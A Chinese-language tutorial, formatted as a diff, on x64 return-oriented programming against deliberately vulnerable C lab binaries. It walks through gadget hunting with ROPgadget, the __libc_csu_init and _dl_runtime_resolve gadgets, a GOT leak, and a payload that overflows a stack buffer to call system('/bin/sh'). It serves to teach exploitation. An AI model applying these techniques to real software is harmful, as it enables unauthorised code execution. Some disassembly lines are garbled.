@@ -1,0 +1,226 @@
+使用工具寻找gadgets
+  我们之前提到x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于pop rdi; ret的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些查找gadgets的工具比较方便。比较有名的工具有：
+ROPEME: https://github.com/packz/ropeme
+Ropper: https://github.com/sashs/Ropper
+ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master
+rp++: https://github.com/0vercl0k/rp
+  
+  #!c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <dlfcn.h>
+
+void systemaddr()
+{
+    void* handle = dlopen("libc.so.6", RTLD_LAZY);
+    printf("%p\n",dlsym(handle,"system"));
+    fflush(stdout);
+}
+
+void vulnerable_function() {
+    char buf[128];
+    read(STDIN_FILENO, buf, 512);
+}
+
+int main(int argc, char** argv) {
+    systemaddr();
+    write(1, "Hello, World\n", 13);
+    vulnerable_function();
+}
+
+gcc -fno-stack-protector level4.c -o level4 -ldl
+
+首先目标程序会打印system()在内存中的地址，这样的话就不需要我们考虑ASLR的问题了，只需要想办法触发buffer overflow然后利用ROP执行system(“/bin/sh”)。但为了调用system(“/bin/sh”)，我们需要找到一个gadget将rdi的值指向“/bin/sh”的地址。于是我们使用ROPGadget搜索一下level4中所有pop ret的gadgets
+
+0x000000000000099c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000000099e : pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000000009a0 : pop r14 ; pop r15 ; ret
+0x00000000000009a2 : pop r15 ; ret
+0x000000000000099b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000000099f : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000000007b0 : pop rbp ; ret
+0x00000000000009a3 : pop rdi ; ret
+0x00000000000009a1 : pop rsi ; pop r15 ; ret
+0x000000000000099d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000000006ce : ret
+我们找到POP RDI, RET 为这个  0x00000000000009a3 : pop rdi ; ret
+python ROPgadget.py --binary /lib/x86_64-linux-gnu/libc.so.6 --only  查找你想要的ROPgadget 在libc.so.6 
+查找 pop|call
+python ROPgadget.py --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|call"|grep rdi
+此时一下几条记录：
+0x000000000015f3a7 : call qword ptr [rdi + 0x10fff788]
+0x000000000015f463 : call qword ptr [rdi - 0x28000878]
+0x00000000000ae994 : call qword ptr [rdi]
+0x00000000000233b1 : call rdi
+0x00000000000e89bb : pop rax ; pop rdi ; call rax
+0x00000000000e89bc : pop rdi ; call rax
+不过此时有这个 0x00000000000e89bb : pop rax ; pop rdi ; call rax 也可以满足我们要求，这个得ROP；链就是：
+payload = "\x00"*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)
+二、
+#!c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void vulnerable_function() {
+    char buf[128];
+    read(STDIN_FILENO, buf, 512);
+}
+
+int main(int argc, char** argv) {
+    write(STDOUT_FILENO, "Hello, World\n", 13);
+    vulnerable_function();
+}
+可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./level5观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。
+
+0000000000000750 <__libc_csu_init>:
+ 750:	41 57                	push   %r15
+ 752:	41 56                	push   %r14
+ 754:	41 89 ff             	mov    %edi,%r15d
+ 757:	41 55                	push   %r13
+ 759:	41 54                	push   %r12
+ 75b:	4c 8d 25 76 06 20 00 	lea    0x200676(%rip),%r12        # 200dd8 <__frame_dummy_init_array_entry>
+ 762:	55                   	push   %rbp
+ 763:	48 8d 2d 76 06 20 00 	lea    0x200676(%rip),%rbp        # 200de0 <__init_array_end>
+ 76a:	53                   	push   %rbx
+ 76b:	49 89 f6             	mov    %rsi,%r14
+ 76e:	49 89 d5             	mov    %rdx,%r13
+ 771:	4c 29 e5             	sub    %r12,%rbp
+ 774:	48 83 ec 08          	sub    $0x8,%rsp
+ 778:	48 c1 fd 03          	sar    $0x3,%rbp
+ 77c:	e8 e7 fd ff ff       	callq  568 <_init>
+ 781:	48 85 ed             	test   %rbp,%rbp
+ 784:	74 20                	je     7a6 <__libc_csu_init+0x56>
+ 786:	31 db                	xor    %ebx,%ebx
+ 788:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
+ 78f:	00 
+ 790:	4c 89 ea             	mov    %r13,%rdx
+ 793:	4c 89 f6             	mov    %r14,%rsi
+ 796:	44 89 ff             	mov    %r15d,%edi
+ 799:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
+ 79d:	48 83 c3 01          	add    $0x1,%rbx
+ 7a1:	48 39 dd             	cmp    %rbx,%rbp
+ 7a4:	75 ea                	jne    790 <__libc_csu_init+0x40>
+ 7a6:	48 83 c4 08          	add    $0x8,%rsp
+ 7aa:	5b                   	pop    %rbx
+ 7ab:	5d                   	pop    %rbp
+ 7ac:	41 5c                	pop    %r12
+ 7ae:	41 5d                	pop    %r13
+ 7b0:	41 5e                	pop    %r14
+ 7b2:	41 5f                	pop    %r15
+ 7b4:	c3                   	retq   
+ 7b5:	90                   	nop
+ 7b6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
+ 7bd:	00 00 00 
+
+00000000000007c0 <__libc_csu_fini>:
+ 7c0:	f3 c3                	repz retq 
+
+Disassembly of section .fini:
+
+00000000000007c4 <_fini>:
+ 7c4:	48 83 ec 08          	sub    $0x8,%rsp
+ 7c8:	48 83 c4 08          	add    $0x8,%rsp
+ 7cc:	c3                   	retq   
+
+ 我们可以看到利用0×7a6处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005f0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx*8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。
+1、我们先构造payload1，利用write()输出write在内存中的地址。注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数
+2、当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着我们构造payload2，利用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。
+3、最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。
+
+三、上次讲到了__libc_csu_init()的一条万能gadgets，其实不光__libc_csu_init()里的代码可以利用，默认gcc还会有如下自动编译进去的函数可以用来查找gadgets。
+_init
+_start
+call_gmon_start
+deregister_tm_clones
+register_tm_clones
+__do_global_dtors_aux
+frame_dummy
+__libc_csu_init
+__libc_csu_fini
+_fini
+除此之外在程序执行的过程中，CPU只会关注于PC指针的地址，并不会关注是否执行了编程者想要达到的效果。因此，通过控制PC跳转到某些经过稍微偏移过的地址会得到意想不到的效果。
+比如说说我们反编译一下__libc_csu_init()这个函数的尾部：
+gdb-peda$ disas __libc_csu_init
+Dump of assembler code for function __libc_csu_init:
+……
+   0x0000000000400606 <+102>:   movrbx,QWORD PTR [rsp+0x8]
+   0x000000000040060b <+107>:   movrbp,QWORD PTR [rsp+0x10]
+   0x0000000000400610 <+112>:   mov    r12,QWORD PTR [rsp+0x18]
+   0x0000000000400615 <+117>:   mov    r13,QWORD PTR [rsp+0x20]
+   0x000000000040061a <+122>:   mov    r14,QWORD PTR [rsp+0x28]
+   0x000000000040061f <+127>:   mov    r15,QWORD PTR [rsp+0x30]
+   0x0000000000400624 <+132>:   add    rsp,0x38
+   0x0000000000400628 <+136>:   ret  
+可以发现我们可以通过rsp控制r12-r15的值，但我们知道x64下常用的参数寄存器是rdi和rsi，控制r12-r15并没有什么太大的用处。不要慌，虽然原程序本身用是为了控制r14和r15寄存器的值。如下面的反编译所示：
+gdb-peda$ x/5i 0x000000000040061a
+   0x40061a <__libc_csu_init+122>:  mov    r14,QWORD PTR [rsp+0x28]
+   0x40061f <__libc_csu_init+127>:  mov    r15,QWORD PTR [rsp+0x30]
+   0x400624 <__libc_csu_init+132>:  add    rsp,0x38
+   0x400628 <__libc_csu_init+136>:  ret  
+但是我们如果简单的对pc做个位移再反编译，我们就会发现esi和edi的值可以被我们控制了！如下面的反编译所示:
+gdb-peda$ x/5i 0x000000000040061b
+   0x40061b <__libc_csu_init+123>:  movesi,DWORD PTR [rsp+0x28]
+   0x40061f <__libc_csu_init+127>:  mov    r15,QWORD PTR [rsp+0x30]
+   0x400624 <__libc_csu_init+132>:  add    rsp,0x38
+   0x400628 <__libc_csu_init+136>:  ret    
+   0x400629:    nop    DWORD PTR [rax+0x0]
+gdb-peda$ x/5i 0x0000000000400620
+   0x400620 <__libc_csu_init+128>:  movedi,DWORD PTR [rsp+0x30]
+   0x400624 <__libc_csu_init+132>:  add    rsp,0x38
+   0x400628 <__libc_csu_init+136>:  ret    
+   0x400629:    nop    DWORD PTR [rax+0x0]
+   0x400630 <__libc_csu_fini>:  repz ret 
+虽然edi和esi只能控制低32位的数值，但已经可以满足我们的很多的rop需求了。
+除了程序默认编译进去的函数，如果我们能得到libc.so或者其他库在内存中的地址，就可以获得到大量的可用的gadgets。比如上一篇文章中提到的通用gadget只能控制三个参数寄存器的值并且某些值只能控制32位，如果我们想要控制多个参数寄存器的值的话只能去寻找其他的gadgets了。这里就介绍一个_dl_runtime_resolve()中的gadget，通过这个gadget可以控制六个64位参数寄存器的值，当我们使用参数比较多的函数的时候（比如mmap和mprotect）就可以派上用场了。
+我们把_dl_runtime_resolve反编译可以得到：
+0x7ffff7def200 <_dl_runtime_resolve>:   sub    rsp,0x38
+0x7ffff7def204 <_dl_runtime_resolve+4>: mov    QWORD PTR [rsp],rax
+0x7ffff7def208 <_dl_runtime_resolve+8>: mov    QWORD PTR [rsp+0x8],rcx
+0x7ffff7def20d <_dl_runtime_resolve+13>:    mov    QWORD PTR [rsp+0x10],rdx
+0x7ffff7def212 <_dl_runtime_resolve+18>:    mov    QWORD PTR [rsp+0x18],rsi
+0x7ffff7def217 <_dl_runtime_resolve+23>:    mov    QWORD PTR [rsp+0x20],rdi
+0x7ffff7def21c <_dl_runtime_resolve+28>:    mov    QWORD PTR [rsp+0x28],r8
+0x7ffff7def221 <_dl_runtime_resolve+33>:    mov    QWORD PTR [rsp+0x30],r9
+0x7ffff7def226 <_dl_runtime_resolve+38>:    movrsi,QWORD PTR [rsp+0x40]
+0x7ffff7def22b <_dl_runtime_resolve+43>:    movrdi,QWORD PTR [rsp+0x38]
+0x7ffff7def230 <_dl_runtime_resolve+48>:    call   0x7ffff7de8680 <_dl_fixup>
+0x7ffff7def235 <_dl_runtime_resolve+53>:    mov    r11,rax
+0x7ffff7def238 <_dl_runtime_resolve+56>:    mov    r9,QWORD PTR [rsp+0x30]
+0x7ffff7def23d <_dl_runtime_resolve+61>:    mov    r8,QWORD PTR [rsp+0x28]
+0x7ffff7def242 <_dl_runtime_resolve+66>:    movrdi,QWORD PTR [rsp+0x20]
+0x7ffff7def247 <_dl_runtime_resolve+71>:    movrsi,QWORD PTR [rsp+0x18]
+0x7ffff7def24c <_dl_runtime_resolve+76>:    movrdx,QWORD PTR [rsp+0x10]
+0x7ffff7def251 <_dl_runtime_resolve+81>:    movrcx,QWORD PTR [rsp+0x8]
+0x7ffff7def256 <_dl_runtime_resolve+86>:    movrax,QWORD PTR [rsp]
+0x7ffff7def25a <_dl_runtime_resolve+90>:    add    rsp,0x48
+0x7ffff7def25e <_dl_runtime_resolve+94>:    jmp    r11
+从0x7ffff7def235开始，就是这个通用gadget的地址了。通过这个gadget我们可以控制rdi，rsi，rdx，rcx， r8，r9的值。但要注意的是_dl_runtime_resolve()在内存中的地址是随机的。所以我们需要先用information leak得到_dl_runtime_resolve()在内存中的地址。那么_dl_runtime_resolve()的地址被保存在了哪个固定的地址呢？
+通过反编译level5程序我们可以看到[email protected]()这个函数使用PLT [0] 去查找write函数在内存中的地址，函数jump过去的地址*0x600ff8其实就是_dl_runtime_resolve()在内存中的地址了。所以只要获取到0x600ff8这个地址保存的数据，就能够找到_dl_runtime_resolve()在内存中的地址：
+0000000000400420 <[email protected]>:
+  400420:   ff 35 ca 0b 20 00       pushq  0x200bca(%rip)        # 600ff0 <_GLOBAL_OFFSET_TABLE_+0x8>
+  400426:   ff 25 cc 0b 20 00       jmpq   *0x200bcc(%rip)        # 600ff8 <_GLOBAL_OFFSET_TABLE_+0x10>
+  40042c:   0f 1f 40 00             nopl   0x0(%rax)
+
+gdb-peda$ x/x 0x600ff8
+0x600ff8 <_GLOBAL_OFFSET_TABLE_+16>:    0x00007ffff7def200
+
+gdb-peda$ x/21i 0x00007ffff7def200
+   0x7ffff7def200 <_dl_runtime_resolve>:    sub    rsp,0x38
+   0x7ffff7def204 <_dl_runtime_resolve+4>:  mov    QWORD PTR [rsp],rax
+   0x7ffff7def208 <_dl_runtime_resolve+8>:  mov    QWORD PTR [rsp+0x8],rcx
+   0x7ffff7def20d <_dl_runtime_resolve+13>: mov    QWORD PTR 
+[rsp+0x10],rdx
+….
+另一个要注意的是，想要利用这个gadget，我们还需要控制rax的值，因为gadget是通过rax跳转的：
+0x7ffff7def235 <_dl_runtime_resolve+53>:    mov    r11,rax
+……
+0x7ffff7def25e <_dl_runtime_resolve+94>:    jmp    r11
+所以我们接下来用ROPgadget查找一下libc.so中控制rax的gadget：
+ROPgadget --binary libc.so.6 --only "pop|ret" | grep "rax"
+0x000000000001f076 : pop rax ; pop rbx ; pop rbp ; ret
+0x0000000000023950 : pop rax ; ret
+0x000000000019176e : pop rax ; ret 0xffed
+0x0000000000123504 : pop rax ; ret 0xfff0
+0x0000000000023950刚好符合我们的要求。有了pop rax和_dl_runtime_resolve这两个gadgets，我们就可以很轻松的调用想要的调用的函数了。
